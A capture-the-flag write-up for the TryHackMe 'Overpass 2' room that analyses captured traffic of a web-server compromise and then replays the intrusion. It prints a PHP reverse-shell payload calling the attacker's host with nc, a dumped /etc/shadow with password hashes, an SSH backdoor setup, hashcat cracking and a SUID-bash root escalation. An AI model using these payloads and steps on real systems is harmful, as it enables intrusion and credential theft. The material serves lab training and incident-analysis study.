# [Overpass 2](https://tryhackme.com/room/overpass2hacked)

> Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened. Can you work out how the attacker got in, and hack your way back into Overpass' production server?

## Incident Analysis

### Initial Compromise

To position themselves for the attack, the threat actor (TA) interacted with Overpass's server (192.168.170.159) from the internal, private IP address 192.168.170.145. How the TA was able to gain access to the internal network and pivot through 192.168.170.145 is not within the scope of this analysis.

The TA browsed to the **Overpass Cloud Sync** development page that allows users to upload files by submitting an HTTP GET request to the `/development/` URI.

```http
GET /development/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "588-5aae9add656f8-gzip"

HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:33:53 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 01:38:24 GMT
ETag: "588-5aae9add656f8-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 675
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<!DOCTYPE html>
<html>

<head>
  <style>
    .formTitle {
      margin: 0;
    }

    /* form {
      display: table;
    }

    form div {
      display: table-row;
    }

    form div label {
      display: table-cell;
    } */

    .formElem label {
      width: 10rem;
      margin: 0 1rem 0 0;
    }
  </style>
  <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
  <title>!!BETA!! - Cloud Sync</title>
</head>

<body>
  <nav>
    <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
    <h2 class="navTitle"><a href="/">Overpass</a></h2>
    <a href="/aboutus">About Us</a>
    <a href="/downloads">Downloads</a>
  </nav>
  <div class="bodyFlexContainer content">
    <div>
      <div>
        <h3 class="formTitle">Overpass Cloud Sync - BETA</h1>
      </div>
      <!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->
      <!-- TODO add downloading of your overpass files -->
      <form action="upload.php" method="post" enctype="multipart/form-data">
        <div class="formElem"><label for="fileToUpload">Upload your .overpass file for cloud synchronisation</label><input type="file"
            name="fileToUpload" id="fileToUpload"></div>
        <div class="formElem"><input type="submit" value="Upload File" name="submit"></div>
      </form>
    </div>
  </div>
</body>
</html>
```

From this page, the TA uploaded a PHP file capable of giving them remote access upon execution by submitting a POST request to the `/development/upload.php` URI.

```http
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 39
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The file payload.php has been uploaded.GET /development/uploads/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 472
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /development/uploads</title>
 </head>
 <body>
<h1>Index of /development/uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/development/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="payload.php">payload.php</a></td><td align="right">2020-07-21 20:34  </td><td align="right"> 99 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.170.159 Port 80</address>
</body></html>
```

The file the TA uploaded was named `payload.php`, with the following content:

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

The TA requested a listing of uploads by submitting an HTTP GET request to the `/development/uploads` URI and then executed their PHP payload by submitting an HTTP GET request to the `/development/uploads/payload.php` URI, presumably by clicking on this link from the uploads listing.

---

### Command & Control

With the payload executed, the TA assumed control of the target machine via a TCP reverse shell to their port 4242. The TA confirmed their access as the `www-data` user account and then read the contents of the `/var/www/html/development/uploads/.overpass` file.

```bash
www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass

,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.
```

The TA elevated their privileges to the `james` account, revealing the credential `james`:`whenevernoteartinstant`.

```bash
www-data@overpass-production:/var/www/html/development/uploads$ su james
Password: whenevernoteartinstant
```

With access to the `james` account, the TA checked which commands they could execute with elevated privileges and found that they could run any.

```bash
james@overpass-production:~$ sudo -l
[sudo] password for james: whenevernoteartinstant

Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin\:/bin:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
```

The TA then dumped the user account hashes from `/etc/shadow`, presumably for offline cracking.

```bash
james@overpass-production:~$ sudo cat /etc/shadow

root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

---

### Persistence

With administrative access on Overpass's server, the TA sought to establish a backdoor as the `james` user leveraging the SSH protocol.

The TA cloned the [`ssh-backdoor`](https://github.com/NinjaJc01/ssh-backdoor) Github repository, generated an SSH public/private key pair (`/home/james/.ssh/id_rsa`), and then ran the `ssh-backdoor` backdoor executable, which was served on TCP port 2222.

```bash
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```

The TA executed the `ssh-backdoor` executable with the flag `-a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`.  According to the executable's source code, this is the `hash` flag.

```go
...[SNIP]...
33 flaggy.String(&hash, "a", "hash", "Hash for backdoor")
...[SNIP]...
```

When attempting to the access the SSH backdoor, the user sends a password. This password is salted with the constant value `1c362db832f3f864c8c2fe05f2002a05` (password concatenated with salt), hashed with the SHA-512 algorithm, and then compred to the hash from the `-a` flag.

```go
...[SNIP]...
55 func verifyPass(hash, salt, password string) bool {
56    resultHash := hashPassword(password, salt)
57    return resultHash == hash
58 }
...[SNIP]...
60 func hashPassword(password string, salt string) string {
61    hash := sha512.Sum512([]byte(password + salt))
62    return fmt.Sprintf("%x", hash)
63 }
...[SNIP]...
107	func passwordHandler(_ ssh.Context, password string) bool {
108    return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
109 }
```

This is meant to allow the TA to specify an authentication factor without entering the password in cleartext on the target machine, but by not changing the program's default salt value and by choosing a password from a known wordlist, this obfuscation attempt is effectively diminished.

---

## Attack Replication

To replicate the attack to gain access to Overpass's server, one could either upload and execute their own PHP reverse shell or access the SSH backdoor, assuming it is still active.

### Gaining Access through the SSH Backdoor

According to the `hashPassword` function from lines 60-63 of the [SSH backdoor's source code](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go) (shown above), the password is concatenated with the salt and then hashed with the SHA-512 algorithm. The target hash is `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` and the constant salt is `1c362db832f3f864c8c2fe05f2002a05`. With this information, `hashcat` can be leveraged to recover the password.

```bash
hashcat -m 1700 -a 0 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 rockyou.txt
```

The recovered credential is `james`:`november16`. Login to the backdoor with this credential.

```bash
ssh james@10.10.18.167 -p 2222
james@10.10.18.167's password: november16
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

---

### Elevating Privileges

At the time of the compromise, `james` had unrestricted `sudo` access on Overpass's server. Though the password `november16` will grant backdoor access to the `james` account, it isn't actually `james`'s account password. At the time of the compromise, it was `whenevernoteartinstant`, but it appears the TA has changed it. Thus, `james`'s previous unrestricted `sudo` access can't be used to elevate privileges.

It turns out the TA left another mechanism for privilege escalation: the hidden file `/home/james/.suid_bash`.

```bash
james@overpass-production:/home/james$ ls -la

total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

As its name describes, this is an executable that grants the user a `bash` shell with `root` privileges. Execute it as so and note the effective user ID (eid):

```bash
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
```
